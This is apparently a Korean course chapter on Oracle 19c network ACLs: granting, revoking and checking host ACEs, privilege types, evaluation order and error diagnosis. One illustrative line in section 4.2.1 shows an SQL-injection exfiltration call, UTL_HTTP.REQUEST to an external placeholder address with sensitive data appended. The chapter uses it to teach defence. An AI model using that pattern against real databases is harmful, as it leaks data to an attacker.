@H1 제4장  네트워크 ACL

@H2 4.1  학습 목표

@P 데이터베이스 안의 PL/SQL은 UTL_HTTP, UTL_TCP, UTL_SMTP 같은 패키지로 외부 서버에 접속할 수 있다. 네트워크 ACL은 어떤 사용자가 어느 호스트의 어느 포트에 어떤 방식으로 접속할 수 있는지를 데이터베이스가 직접 판정하게 하는 장치다.

@B 네트워크 유틸리티 패키지에 ACL이 필요한 이유와 ORA-24247이 나는 조건을 설명할 수 있다.
@B ACL과 ACE의 관계, XS$ACE_TYPE의 구성 요소를 설명할 수 있다.
@B `DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE`와 `REMOVE_HOST_ACE`로 호스트 접근 권한을 주고 회수할 수 있다.
@B http, smtp, connect, resolve 권한이 각각 허용하는 호출을 구분하고 최소 권한으로 설계할 수 있다.
@B 와일드카드 호스트, 포트 범위, 거부 ACE가 섞였을 때의 판정 순서를 설명할 수 있다.
@B 구버전 API(CREATE_ACL, ASSIGN_ACL 등)로 만든 ACL을 19c 뷰에서 확인하고 새 API로 옮길 수 있다.
@B DBA_HOST_ACES, DBA_HOST_ACLS, USER_HOST_ACES로 권한을 점검하고 ACL 관련 오류의 원인을 찾을 수 있다.

@H2 4.2  네트워크 접근 제어의 개념

@H3 4.2.1  데이터베이스가 외부로 나가는 경로

@B 데이터베이스는 보통 접속을 받는 쪽이다. PL/SQL 패키지를 쓰면 반대로 데이터베이스가 외부 서버에 접속하는 쪽이 된다.
@B 주문이 들어오면 결제 서버에 HTTP로 요청하고, 배치가 끝나면 메일을 보내고, 사내 디렉터리 서버에서 사용자 정보를 읽는 식의 구현이 흔하다.
@B 이 경로는 데이터 유출 통로가 되기도 한다. SQL 인젝션에 성공한 공격자가 `UTL_HTTP.REQUEST('http://외부주소/?d=' || 민감데이터)`를 실행하면 조회 결과가 외부로 나간다.
@B 내부망의 다른 서버를 탐색하는 발판으로도 쓰인다. DB 서버는 방화벽 안쪽에 있어 외부에서 직접 닿지 않는 서버에도 접속할 수 있다.
@B 그래서 "누가, 어디로, 무엇으로" 나갈 수 있는지를 데이터베이스 안에서 따로 통제한다.

@H3 4.2.2  ACL의 통제를 받는 패키지

@TBL
패키지·타입 | 하는 일 | 필요한 ACL 권한
UTL_HTTP | HTTP·HTTPS 요청 | http 또는 connect
HttpUriType | URI로 웹 자원 읽기 | http 또는 connect
UTL_SMTP | SMTP 메일 송신 | smtp 또는 connect
UTL_MAIL | UTL_SMTP 기반 메일 송신 | smtp 또는 connect
UTL_TCP | 임의의 TCP 연결 | connect
DBMS_LDAP | LDAP 디렉터리 접속 | connect
UTL_INADDR | 호스트 이름 ↔ IP 변환 | resolve
@END

@B 이 패키지들의 EXECUTE 권한은 설치 직후 PUBLIC에 부여돼 있다. 모든 사용자가 패키지를 호출할 수 있다.
@B 실행 권한만으로는 아무 데도 접속하지 못한다. 접속 시점에 데이터베이스가 ACL을 확인해 허용된 경우에만 연결을 연다.
@B 예전에는 PUBLIC의 실행 권한을 회수하는 것이 유일한 방어였다. 그러면 정상 업무 계정까지 막혀 다시 개별 부여해야 했다. ACL은 실행 권한을 그대로 두고 목적지 단위로 제한한다.

@H3 4.2.3  기본 거부와 ORA-24247

@B 11g Release 1부터 네트워크 접근은 기본 거부다. ACL에 허용 항목이 없으면 호출은 ORA-24247: network access denied by access control list (ACL)로 끝난다.
@B UTL_HTTP를 통해 나면 ORA-29273: HTTP request failed 아래에 ORA-24247이 함께 나온다. 겉의 ORA-29273만 보고 대상 서버 문제로 오해하지 않는다.
@B 대상 서버가 꺼져 있을 때도 ORA-29273이 나지만 그 아래 오류가 ORA-12541: TNS:no listener 같은 연결 오류다. ACL 문제와는 아래 줄로 구분한다.
@B 10g 이전 DB를 업그레이드하면 네트워크 패키지를 쓰던 애플리케이션이 업그레이드 직후부터 ORA-24247로 실패한다. 매뉴얼의 업그레이드 관련 절이 짚는 대표 증상이다.

@CODE
ACL_U1@orcl> SELECT SUBSTR(UTL_HTTP.REQUEST('http://172.16.225.50:8090/'), 1, 40) AS page FROM dual;
SELECT SUBSTR(UTL_HTTP.REQUEST('http://172.16.225.50:8090/'), 1, 40) AS page FROM dual
              *
ERROR at line 1:
ORA-29273: HTTP request failed
ORA-06512: at "SYS.UTL_HTTP", line 1530
ORA-24247: network access denied by access control list (ACL)
@END

@H3 4.2.4  ACL과 ACE

@B ACL(Access Control List)은 권한 항목의 목록이다. 목록의 각 항목을 ACE(Access Control Entry)라 부른다.
@B ACE 하나는 "어떤 주체(사용자·역할)에게 어떤 권한을 허용 또는 거부한다"를 담는다.
@B ACL은 호스트(와 포트 범위)에 연결된다. 한 호스트·포트 범위 조합에는 ACL이 하나만 연결된다.
@B 12c부터 네트워크 ACL은 Real Application Security(RAS)의 ACL 객체로 저장된다. 설정은 모두 SYS 스키마에 남는다.
@B 19c에서는 ACL을 직접 만들 필요가 없다. 호스트에 ACE를 덧붙이면 그 호스트용 ACL이 없을 때 자동으로 생성되며, 이름은 `NETWORK_ACL_` 뒤에 고유 문자열이 붙은 형태다.

@TBL
구분 | 11g 방식 | 12c 이후(19c) 방식
설정 단위 | ACL 파일을 만들고 권한 추가 후 호스트에 할당 | 호스트에 ACE를 덧붙임
ACL 이름 | 사용자가 지정한 XML 이름(/sys/acls/이름.xml) | 시스템 생성 이름(NETWORK_ACL_...)
저장 | XML DB 리포지토리 | RAS ACL 객체(SYS 스키마)
조회 뷰 | DBA_NETWORK_ACLS, DBA_NETWORK_ACL_PRIVILEGES | DBA_HOST_ACLS, DBA_HOST_ACES
@END

@H3 4.2.5  호출 한 번에 일어나는 판정

@TBL
순서 | 일어나는 일 | 실패 시
1 | 세션이 UTL_HTTP.REQUEST 등 네트워크 패키지 호출 | 실행 권한이 없으면 PLS-00201·ORA-06550
2 | URL에서 호스트 문자열과 포트를 꺼냄 | URL 형식이 잘못되면 UTL_HTTP 오류
3 | 호스트에 대해 가장 구체적인 ACL부터 차례로 검색 | -
4 | 세션 사용자와 켜진 역할에 해당하는 ACE로 허용·거부 판정 | 허용이 없으면 ORA-24247
5 | 실제 TCP 연결 | 대상이 꺼져 있으면 ORA-12541, 방화벽이면 ORA-12535
@END

@B 1단계의 실행 권한과 3~4단계의 ACL은 서로 다른 장치다. 실행 권한을 회수하면 1단계에서, ACL이 없으면 4단계에서 막힌다.
@B 4단계까지 통과한 뒤의 오류는 데이터베이스 보안 설정과 무관하다. 네트워크 담당자와 확인할 문제다.

@CASE SQL 인젝션 시도가 외부로 나가지 못했다
웹 애플리케이션의 검색 화면에서 SQL 인젝션 취약점이 발견됐다. 접근 로그를 분석하니 공격자는 UTL_HTTP.REQUEST로 회원 테이블의 내용을 외부 서버에 보내려고 여러 번 시도했다.
DB 감사 기록에는 같은 시각 애플리케이션 계정의 ORA-24247이 연달아 남아 있었다. 이 계정은 결제사 호스트 한 곳, 포트 443에만 http ACE가 있었고 공격자의 서버 주소는 허용 목록에 없었다.
취약점은 애플리케이션에서 고쳤고, 데이터는 외부로 나가지 않았다. 이후 ORA-24247 발생 건수를 보안 모니터링 지표에 넣었다.
@END

@H2 4.3  ACE 관리 API — DBMS_NETWORK_ACL_ADMIN

@H3 4.3.1  APPEND_HOST_ACE

@CODE
BEGIN
  DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(
    host       => '172.16.225.50',
    lower_port => 8090,
    upper_port => 8090,
    ace        => xs$ace_type(privilege_list => xs$name_list('http'),
                              principal_name => 'ACL_U1',
                              principal_type => xs_acl.ptype_db));
END;
/
@END

@TBL
인자 | 의미
host | 호스트 이름 또는 IP. 와일드카드로 도메인·서브넷 지정 가능. 대소문자 구분 없음
lower_port, upper_port | TCP 포트 범위(1~65535). upper_port를 생략하면 lower_port와 같은 값. 둘 다 생략하면 포트 제한 없음
ace | XS$ACE_TYPE으로 만든 권한 항목
@END

@B 이 호출 하나가 11g의 CREATE_ACL, ADD_PRIVILEGE, ASSIGN_ACL 세 단계를 대신한다.
@B 같은 주체에 이미 있는 권한을 다시 덧붙이면 중복은 건너뛴다. 실수로 두 번 실행해도 ACE가 두 개 생기지 않는다.
@B 연결된 ACL이 다른 호스트와 공유돼 있으면 수정 전에 사본을 만든다. 한 호스트를 고친 결과가 다른 호스트에 번지지 않는다.
@B 호출이 성공하면 바로 효력이 생긴다. COMMIT이 필요하지 않다.

@H3 4.3.2  XS$ACE_TYPE

@TBL
필드 | 의미 | 비고
privilege_list | 권한 이름 목록. xs$name_list('http', 'smtp') 형식 | 대소문자 구분 없음
principal_name | 데이터베이스 사용자 또는 역할 | 큰따옴표로 감싸지 않으면 대소문자 구분 없음
principal_type | 주체 유형 | 반드시 xs_acl.ptype_db
granted | TRUE면 허용, FALSE면 거부 | 기본 TRUE
start_date, end_date | 유효 기간 | 기간 한정 권한에 사용
@END

@B principal_type의 기본값은 PTYPE_XS로, RAS 애플리케이션 사용자를 뜻한다. 데이터베이스 사용자에게 주려면 `xs_acl.ptype_db`를 반드시 적는다.
@B granted => FALSE로 만든 ACE는 GRANT_TYPE이 DENY로 표시된다. 넓은 범위를 허용하고 일부만 막을 때 쓴다(4.6절).
@B 한 ACL 안에서 ACE는 ACE_ORDER 순서로 쌓인다. APPEND_HOST_ACE는 이름 그대로 목록 끝에 덧붙인다.
@B start_date와 end_date를 쓰면 외부 업체 연동 기간처럼 정해진 기간에만 권한이 유효하다. 기간이 지나도 ACE는 남으므로 정기 점검에서 정리한다.

@H3 4.3.3  REMOVE_HOST_ACE

@CODE
BEGIN
  DBMS_NETWORK_ACL_ADMIN.REMOVE_HOST_ACE(
    host             => '172.16.225.50',
    ace              => xs$ace_type(privilege_list => xs$name_list('http'),
                                    principal_name => 'ACL_U2',
                                    principal_type => xs_acl.ptype_db,
                                    granted        => FALSE),
    remove_empty_acl => TRUE);
END;
/
@END

@B 지정한 ACE의 권한을 해당 호스트 ACL에서 뺀다. 호스트, 포트 범위, 권한, 주체, granted 값이 추가할 때와 같아야 한다.
@B 맞는 ACE가 없으면 ORA-01927: cannot REVOKE privileges you did not grant가 난다. 메시지가 객체 권한 회수와 같아 처음 보면 엉뚱해 보인다.
@B remove_empty_acl => TRUE를 주면 ACE가 하나도 남지 않은 ACL을 함께 지운다. 기본값 FALSE면 빈 ACL이 호스트에 남는다.
@B 지울 대상은 DBA_HOST_ACES에서 호스트, 포트, 주체, 권한, GRANT_TYPE을 그대로 읽어 인자로 넘기면 틀리지 않는다.

@B 유효 기간을 둔 예는 다음과 같다. 연동 시험 기간 2주 동안만 시험 서버에 대한 http를 연다.

@CODE
BEGIN
  DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(
    host       => 'test-pay.example.com',
    lower_port => 443,
    ace        => xs$ace_type(privilege_list => xs$name_list('http'),
                              principal_name => 'APP_USER',
                              principal_type => xs_acl.ptype_db,
                              start_date     => SYSTIMESTAMP,
                              end_date       => SYSTIMESTAMP + INTERVAL '14' DAY));
END;
/
@END

@B 여러 호스트를 같은 주체에 한꺼번에 주려면 호스트 목록을 돌며 APPEND_HOST_ACE를 호출한다. 중복 권한은 건너뛰므로 같은 스크립트를 다시 실행해도 안전하다.

@CODE
BEGIN
  FOR h IN (SELECT column_value AS host
              FROM TABLE(sys.odcivarchar2list('mail1.example.com', 'mail2.example.com'))) LOOP
    DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(
      host       => h.host,
      lower_port => 25,
      ace        => xs$ace_type(privilege_list => xs$name_list('smtp'),
                                principal_name => 'BATCH_USER',
                                principal_type => xs_acl.ptype_db));
  END LOOP;
END;
/
@END

@H3 4.3.4  구버전 API와의 대응

@TBL
구버전(12c부터 디프리케이트) | 대체 API
CREATE_ACL, ADD_PRIVILEGE, ASSIGN_ACL | APPEND_HOST_ACE
DELETE_PRIVILEGE, UNASSIGN_ACL | REMOVE_HOST_ACE
ASSIGN_WALLET_ACL | APPEND_WALLET_ACE
UNASSIGN_WALLET_ACL | REMOVE_WALLET_ACE
CHECK_PRIVILEGE, CHECK_PRIVILEGE_ACLID, DROP_ACL | 대체 없음(하위 호환용으로만 유지)
@END

@NOTE 원본 실습 자료와 다른 점
과정 원본 자료는 CREATE_ACL로 test_acl_file.xml을 만들고 ADD_PRIVILEGE, ASSIGN_ACL로 사용자와 호스트를 붙이는 11g 방식을 쓴다. 19c에서도 이 호출은 동작하며, 만들어진 ACL은 DBA_HOST_ACLS와 DBA_HOST_ACES에 새 방식의 ACL과 함께 나타난다.
다만 PL/SQL Packages and Types Reference는 이 프로시저들을 12c부터 디프리케이트로 표시하고 APPEND_HOST_ACE와 REMOVE_HOST_ACE를 쓰도록 권장한다. 이 교안의 실습은 새 API로 진행하고, 구버전 API는 실습 04에서 기존 ACL을 읽는 법을 익히는 용도로만 다룬다.
같은 이름으로 CREATE_ACL을 다시 실행하면 ORA-46212: XS entity with this name already exists가 난다. ACL이 RAS 객체로 저장된다는 흔적이다.
@END

@H3 4.3.5  계정 정리와 ACE

@B 19.3에서 DROP USER로 계정을 지우면 그 계정이 주체인 ACE는 함께 사라진다. 같은 이름으로 계정을 다시 만들어도 예전 권한은 살아나지 않는다.
@B 그러나 ACE만 사라지고 그 호스트에 할당된 ACL은 빈 채로 남는다. DBA_HOST_ACLS에는 호스트가 계속 보이고 DBA_HOST_ACES에는 아무것도 없는 상태가 된다.
@B 이 빈 ACL은 REMOVE_HOST_ACE로 지울 수 없다. 지울 ACE가 없으므로 ORA-01927이 난다. `DBMS_NETWORK_ACL_ADMIN.SET_HOST_ACL`에 acl => NULL을 주어 호스트 할당을 해제해야 정리된다.
@B 깔끔하게 정리하려면 계정을 지우기 전에 그 계정이 주체인 ACE를 remove_empty_acl => TRUE로 먼저 지운다.

@CODE
BEGIN
  FOR r IN (SELECT host, lower_port, upper_port, principal, privilege, grant_type
              FROM dba_host_aces WHERE principal = 'OLD_APP') LOOP
    DBMS_NETWORK_ACL_ADMIN.REMOVE_HOST_ACE(
      host             => r.host,
      lower_port       => r.lower_port,
      upper_port       => r.upper_port,
      ace              => xs$ace_type(privilege_list => xs$name_list(r.privilege),
                                      principal_name => r.principal,
                                      principal_type => xs_acl.ptype_db,
                                      granted        => (r.grant_type = 'GRANT')),
      remove_empty_acl => TRUE);
  END LOOP;
END;
/
@END

@CODE
-- 빈 ACL 찾기와 정리
SELECT l.host, l.lower_port, l.upper_port, l.acl
  FROM dba_host_acls l
 WHERE NOT EXISTS (SELECT 1 FROM dba_host_aces a
                    WHERE a.host = l.host
                      AND NVL(a.lower_port, -1) = NVL(l.lower_port, -1));

EXEC DBMS_NETWORK_ACL_ADMIN.SET_HOST_ACL(host => 'old.example.com', lower_port => NULL, upper_port => NULL, acl => NULL)
@END

@B 실습 05의 철거 단계가 이 방식이다. 조회 결과를 그대로 인자로 넘기므로 호스트 대소문자, 포트, GRANT·DENY를 틀릴 일이 없다.

@H2 4.4  권한 종류와 최소 권한

@H3 4.4.1  호스트 ACE에 쓰는 권한

@TBL
권한 | 허용하는 것
http | UTL_HTTP, HttpUriType으로 해당 호스트에 HTTP 요청
http_proxy | 프록시를 거치는 HTTP 요청. 프록시 경유 시 http와 함께 필요
smtp | UTL_SMTP, UTL_MAIL로 메일 송신
connect | UTL_TCP, UTL_SMTP, UTL_MAIL, UTL_HTTP, DBMS_LDAP, HttpUriType의 네트워크 연결 전반
resolve | UTL_INADDR로 호스트 이름과 IP 변환
jdwp | Java Debug Wire Protocol로 Java·PL/SQL 디버깅 연결
@END

@B connect는 가장 넓은 권한이다. 모든 네트워크 패키지의 연결을 허용한다.
@B HTTP 호출만 하는 애플리케이션에 connect를 주면 같은 호스트·포트로 UTL_TCP 원시 연결까지 열린다. 매뉴얼은 http, smtp처럼 용도별 권한을 쓰도록 권장한다.
@B http 권한만 받은 사용자가 같은 포트로 UTL_TCP 연결을 열면 ORA-24247이다. 실습 02에서 확인한다.
@B resolve는 이름 풀이만 허용한다. 이름으로 접속하는 코드라도 데이터베이스가 내부적으로 하는 이름 해석에는 resolve가 필요하지 않다. UTL_INADDR를 직접 호출할 때 필요하다.
@B jdwp는 개발 서버에서 SQL Developer 같은 도구로 PL/SQL을 디버깅할 때 쓴다. 운영 DB에는 주지 않는다.

@H3 4.4.2  주체 선택 — 사용자와 역할

@B 주체에는 사용자와 역할 모두 쓸 수 있다. 같은 목적지를 쓰는 사용자가 여럿이면 역할에 ACE를 주고 역할을 부여하는 편이 관리하기 쉽다.
@B 역할 ACE는 세션에서 그 역할이 켜져 있을 때만 통한다. SET ROLE NONE으로 역할을 끄면 같은 사용자도 ORA-24247을 받는다.
@B 정의자 권한(definer's rights) 프로시저 안에서는 역할이 비활성화된다. 프로시저가 UTL_HTTP를 호출한다면 프로시저 소유자에게 직접 ACE를 준다.
@B 호출자 권한(invoker's rights) 프로시저는 호출한 사용자의 권한으로 판정된다. 같은 코드라도 누가 부르느냐에 따라 결과가 달라진다.

@BP 최소 권한 원칙
목적지는 와일드카드 대신 구체적인 호스트로 지정한다. 업체 서버가 여러 대면 그 서브넷까지만 연다.
포트는 실제로 쓰는 포트 하나로 제한한다. HTTPS라면 443만 연다.
권한은 http, smtp처럼 용도별로 준다. connect는 UTL_TCP가 꼭 필요한 경우에만 쓴다.
주체는 애플리케이션 계정 하나 또는 역할 하나로 모은다. 개인 계정에 직접 주지 않는다.
@END

@CASE SQL*Plus에서는 되는데 프로시저로 감싸면 실패한다
개발자가 SQL*Plus에서 UTL_HTTP.REQUEST를 직접 실행해 응답을 확인한 뒤, 같은 호출을 프로시저로 만들어 배포했다. 프로시저를 실행하자 ORA-24247이 났다.
개발 계정은 WEB_CALLER 역할을 통해 http ACE를 받고 있었다. SQL*Plus 세션에서는 역할이 켜져 있어 통과했지만, 정의자 권한 프로시저 안에서는 역할이 비활성화되어 ACE가 적용되지 않았다.
프로시저 소유 계정에 직접 http ACE를 주자 해결됐다. 역할은 대화형 사용자용으로 남기고, 저장 프로시저 소유자에게는 직접 부여하는 것을 팀 규칙으로 정했다.
@END

@H3 4.4.3  메일 발송 구성 예

@B UTL_MAIL은 기본 설치되지 않는다. `$ORACLE_HOME/rdbms/admin/utlmail.sql`과 `prvtmail.plb`를 SYS로 실행해 설치한다.
@B 메일 서버는 초기화 파라미터 `SMTP_OUT_SERVER`에 `호스트:포트` 형식으로 지정한다. 파라미터만 설정하고 ACL을 주지 않으면 UTL_MAIL.SEND가 ORA-24247로 실패한다.
@B 메일 발송에 필요한 권한은 smtp다. 메일 서버 호스트와 포트 25(또는 587)로 제한해 준다.
@B UTL_SMTP로 직접 세션을 여는 코드도 같은 smtp 권한으로 동작한다.

@CODE
SYS@orcl> ALTER SYSTEM SET smtp_out_server = 'mail.example.com:25' SCOPE = BOTH;

BEGIN
  DBMS_NETWORK_ACL_ADMIN.APPEND_HOST_ACE(
    host       => 'mail.example.com',
    lower_port => 25,
    ace        => xs$ace_type(privilege_list => xs$name_list('smtp'),
                              principal_name => 'BATCH_USER',
                              principal_type => xs_acl.ptype_db));
END;
/
@END

@H3 4.4.4  프록시를 거치는 HTTP

@B 사내망에서 외부로 나가는 HTTP가 프록시 서버를 거쳐야 하면 `UTL_HTTP.SET_PROXY`로 프록시를 지정한다.
@B 이때 프록시 서버 호스트·포트에 대한 http_proxy 권한과 최종 목적지 호스트에 대한 http 권한이 함께 필요하다. 매뉴얼은 프록시 경유 요청에서 http_proxy를 http와 함께 쓰도록 적고 있다.
@B 프록시만 열어 두면 프록시가 허용하는 모든 외부 주소로 나갈 수 있다. 목적지 http 권한으로 실제 대상 호스트를 제한하는 구성이 필요하다.

@NOTE connect를 주던 습관
11g 시절 자료와 예제는 대부분 connect와 resolve 두 권한만 쓴다. 당시 네트워크 ACL의 권한이 사실상 그 두 가지였기 때문이다.
12c부터 http, http_proxy, smtp 같은 세분화된 권한이 생겼다. 예전 스크립트를 그대로 옮겨 쓰면 필요보다 넓은 connect가 계속 퍼지므로, 새로 등록할 때 용도별 권한으로 바꾼다.
@END

@H2 4.5  호스트와 포트 지정

@H3 4.5.1  호스트 문자열과 와일드카드

@B host에는 `www.example.com` 같은 이름이나 `172.16.225.50` 같은 IP를 쓴다.
@B 와일드카드는 왼쪽에만 쓴다. `*.example.com`은 example.com의 모든 하위 호스트, `172.16.225.*`은 그 서브넷 전체, `*`는 모든 호스트다.
@B ACL 판정은 호출할 때 적은 호스트 문자열로 한다. IP로 등록하고 이름으로 호출하면 다른 호스트로 취급되어 ORA-24247이 난다.
@B 실습 02에서 172.16.225.50에 http를 준 사용자가 `http://oel7v9:8090/`을 호출하자 거부됐다. oel7v9가 172.16.225.50으로 풀리는 이름이어도 ACL은 별개로 본다.
@B 애플리케이션 코드가 이름을 쓰는지 IP를 쓰는지 먼저 확인하고 그 문자열로 등록한다. 둘 다 쓰면 둘 다 등록한다.

@CASE 개발 서버에서는 되는데 운영 서버에서만 ORA-24247
결제 연동 모듈이 개발 DB에서는 정상인데 운영 DB에서 ORA-24247로 실패했다. 두 DB 모두 결제 서버 IP로 http ACE가 등록돼 있었다.
애플리케이션 설정을 확인하니 개발 환경은 IP로, 운영 환경은 결제사가 안내한 도메인 이름으로 URL을 만들고 있었다.
운영 DB에 도메인 이름으로 ACE를 추가하자 정상화됐다. IP로 등록한 ACE는 쓰이지 않으므로 정리했고, 이후 ACL 등록 요청서에 "URL에 쓰는 호스트 문자열 그대로"를 적도록 양식을 바꿨다.
@END

@H3 4.5.2  포트 범위의 규칙

@B 포트 범위는 connect 계열 권한(http, smtp, connect 등 TCP 연결)에만 의미가 있다.
@B resolve는 포트 범위가 없는 ACL에만 들어갈 수 있다. 포트를 지정해 resolve를 덧붙이면 ORA-24244: invalid host or port for access control list (ACL) assignment가 난다.
@B 같은 호스트에 연결되는 포트 범위끼리는 겹칠 수 없다. 8090~8090 범위 ACL이 있는 호스트에 8000~8100 범위로 ACE를 덧붙이면 ORA-24244다.
@B 이미 있는 범위와 똑같은 범위로 주면 그 ACL에 ACE가 추가된다. 범위를 넓히려면 기존 ACE를 지우고 새 범위로 다시 준다.
@B 포트를 생략한 ACL은 그 호스트의 모든 포트에 적용된다. 포트 범위가 있는 ACL과 함께 있으면 포트 범위가 있는 쪽이 먼저 판정된다.

@CODE
SYS@orcl> SELECT host, lower_port lo, upper_port hi, ace_order ord, principal, privilege, grant_type
  2    FROM dba_host_aces WHERE principal LIKE 'ACL%' ORDER BY host, lo, ord;

HOST                     LO         HI        ORD PRINCIPAL  PRIVILEGE GRANT
---------------- ---------- ---------- ---------- ---------- --------- -----
172.16.225.50          8090       8090          1 ACL_U1     HTTP      GRANT
172.16.225.50          8090       8090          2 ACL_U1     CONNECT   GRANT
oel7v9                                          1 ACL_U1     RESOLVE   GRANT
@END

@CASE 포트를 하나 더 열어 달라는 요청
8080 포트로 연동하던 업체가 8443을 추가로 쓰게 되어 같은 호스트에 대한 포트를 넓혀 달라는 요청이 왔다. 담당자가 8080~8443 범위로 ACE를 덧붙이려 하자 ORA-24244가 났다.
같은 호스트에 이미 8080~8080 범위의 ACL이 있었고, 새 범위가 그 범위와 겹쳤기 때문이다.
필요한 것은 범위가 아니라 포트 두 개였다. 8443~8443 범위로 따로 덧붙이자 겹치지 않아 정상 등록됐다. 범위를 넓히면 그 사이의 300여 개 포트까지 열리므로, 포트는 실제로 쓰는 것만 하나씩 등록하는 편이 낫다.
@END

@H3 4.5.3  localhost와 루프백

@B 같은 서버의 서비스를 호출할 때 `localhost`, `127.0.0.1`, 서버 이름, 서버 IP는 모두 다른 호스트 문자열이다.
@B 설치 직후 localhost에는 ORACLE_OCM 계정의 resolve ACE가 있다. 오라클 구성 관리자용이며 일반 사용자 권한과 관계없다.
@B 로컬 서비스 호출을 허용할 때도 애플리케이션이 실제로 쓰는 문자열 하나만 등록한다. 루프백을 열어 두면 DB 서버에서 도는 관리용 웹 콘솔 등 내부 전용 서비스에 접근할 통로가 된다.

@H2 4.6  판정 순서와 거부 ACE

@H3 4.6.1  가장 구체적인 호스트부터

@B 사용자가 어떤 호스트에 접속하려 하면 데이터베이스는 그 호스트에 대해 가장 구체적인 ACL부터 차례로 찾는다.
@B 검색 순서는 `DBMS_NETWORK_ACL_UTILITY.DOMAINS`로 볼 수 있다. 172.16.225.50이면 172.16.225.50 → 172.16.225.* → 172.16.* → 172.* → * 순서다.
@B 이름이면 www.us.example.com → *.us.example.com → *.example.com → *.com → * 순서다.
@B 하위 도메인에 할당된 ACL이 상위 도메인의 ACL보다 우선한다. 같은 호스트에서는 포트 범위가 있는 ACL이 포트 범위가 없는 ACL보다 우선한다.
@B 구체적인 ACL에 그 사용자에 대한 판정이 있으면 거기서 끝난다. 판정이 없으면 다음 단계의 ACL로 넘어간다.

@CODE
SYS@orcl> SELECT column_value AS domain FROM TABLE(DBMS_NETWORK_ACL_UTILITY.DOMAINS('172.16.225.50'));

DOMAIN
--------------------
172.16.225.50
172.16.225.*
172.16.*
172.*
*
@END

@H3 4.6.2  거부 ACE 활용

@B granted => FALSE로 만든 ACE는 그 주체의 권한을 거부한다.
@B 서브넷 전체를 허용하고 특정 서버만 막는 구성이 대표적이다. `172.16.225.*`에 허용, `172.16.225.50`에 거부를 두면 172.16.225.50만 ORA-24247이다.
@B 호스트 단위 거부가 서브넷 허용보다 구체적이라 먼저 판정되기 때문이다.
@B 거꾸로 `*`에 거부를 두고 특정 호스트에 허용을 두는 구성은 의미가 없다. 기본이 이미 거부이므로 허용만 두면 같은 결과다.
@B 한 ACL 안에 같은 주체에 대한 허용과 거부를 함께 두면 ACE_ORDER 순서에 따라 결과가 달라질 수 있다. 한 주체·한 호스트에는 한 가지 판정만 둔다.

@H3 4.6.3  사용자가 직접 보는 판정 결과

@B USER_HOST_ACES는 현재 사용자에게 적용되는 호스트 ACE와 그 판정(GRANTED, DENIED)을 보여 준다. PUBLIC에 열려 있다.
@B ORA-24247을 받은 개발자가 DBA에게 묻기 전에 스스로 어떤 호스트·포트에 어떤 권한이 있는지 확인할 수 있다.
@B 역할을 통해 받은 권한도 역할이 켜져 있으면 나타난다.

@CODE
ACL_U2@orcl> SELECT host, lower_port lo, upper_port hi, privilege, status FROM user_host_aces ORDER BY host;

HOST                     LO         HI PRIVILEGE STATUS
---------------- ---------- ---------- --------- -------
172.16.225.*                           HTTP      GRANTED
172.16.225.50                          HTTP      DENIED
@END

@NOTE 원본의 CHECK_PRIVILEGE 계열
원본 자료는 DBMS_NETWORK_ACL_ADMIN.CHECK_PRIVILEGE와 CHECK_PRIVILEGE_ACLID로 사용자별 판정을 확인한다. 19c에서도 동작하지만 하위 호환용으로만 남은 함수다.
새로 만드는 점검 스크립트는 DBA_HOST_ACES와 USER_HOST_ACES를 기준으로 짠다. 뷰는 주체·권한·포트·허용 여부를 한 번에 보여 줘 점검표로 옮기기 쉽다.
@END

@H3 4.6.4  판정 사례 정리

@TBL
등록된 ACE | 호출 | 결과
172.16.225.50:8090 http (U1) | U1, UTL_HTTP http://172.16.225.50:8090/ | 허용
172.16.225.50:8090 http (U1) | U1, UTL_TCP 172.16.225.50 8090 | ORA-24247(connect 아님)
172.16.225.50:8090 http (U1) | U1, UTL_HTTP http://oel7v9:8090/ | ORA-24247(호스트 문자열 다름)
172.16.225.50:8090 connect (U1) | U1, UTL_TCP 172.16.225.50 1521 | ORA-24247(포트 범위 밖)
172.16.225.* http 허용, 172.16.225.50 http 거부 (U2) | U2, UTL_HTTP http://172.16.225.50:8090/ | ORA-24247(구체적 거부 우선)
역할 R에 http, U3는 R 보유 | U3, SET ROLE NONE 후 호출 | ORA-24247(역할 꺼짐)
@END

@B 표의 행은 모두 실습 01~04에서 직접 확인한다. 결과가 거부인 행은 원인이 모두 다르다는 점을 진단할 때 떠올린다.

@H3 4.6.5  DBMS_NETWORK_ACL_UTILITY로 우선순위 확인

@P 호스트 ACL이 수십 개로 늘면 어느 ACL이 먼저 판정되는지 눈으로 따라가기 어렵다. DBMS_NETWORK_ACL_UTILITY는 판정 순서를 SQL로 재현하는 함수를 제공하며, EXECUTE 권한이 PUBLIC에 있다.

@TBL
함수 | 반환값(PL/SQL Packages and Types Reference 기준)
DOMAINS(host) | 그 호스트의 판정에 쓰이는 호스트·도메인·서브넷 목록. 구체적인 것부터 나옴
DOMAIN_LEVEL(host) | 호스트·도메인·서브넷의 단계 수. 클수록 구체적
CONTAINS_HOST(host, domain) | host가 domain에 포함되면 우선순위 값, 포함되지 않으면 NULL
EQUALS_HOST(host1, host2) | 두 호스트·도메인·서브넷이 같으면 1, 다르면 0
@END

@B CONTAINS_HOST의 값은 domain 종류에 따라 다르다. 호스트 이름이면 도메인 단계 + 1, 도메인이면 도메인 단계, IP·서브넷이면 유효 주소 비트 수, `*`이면 0이다.
@B 값이 클수록 먼저 판정된다. 특정 호스트에 걸리는 ACL을 우선순위 순으로 늘어놓는 조회가 된다.
@B 두 함수 모두 이름 풀이를 하지 않는다. 이름과 IP가 같은 서버를 가리켜도 서로 포함 관계로 보지 않으며, 4.5.1의 판정 규칙과 같다.
@B DOMAINS와 DOMAIN_LEVEL은 IPv6 주소와 CIDR 표기 서브넷을 다루지 못한다고 문서에 적혀 있다. IPv4 표기로 등록한 환경에서 쓴다.

@CODE
-- 172.16.225.50 호출에 관여하는 ACL을 판정 순서대로(문서 예제 형식)
SELECT host, lower_port, upper_port, acl, precedence
  FROM (SELECT host, lower_port, upper_port, acl,
               DBMS_NETWORK_ACL_UTILITY.CONTAINS_HOST('172.16.225.50', host) AS precedence
          FROM dba_host_acls)
 WHERE precedence IS NOT NULL
 ORDER BY precedence DESC, lower_port NULLS LAST;
@END

@B 결과의 첫 행이 가장 먼저 판정되는 ACL이다. 같은 호스트에서 포트 범위가 있는 행을 앞에 두려고 lower_port가 NULL인 행을 뒤로 보낸다.
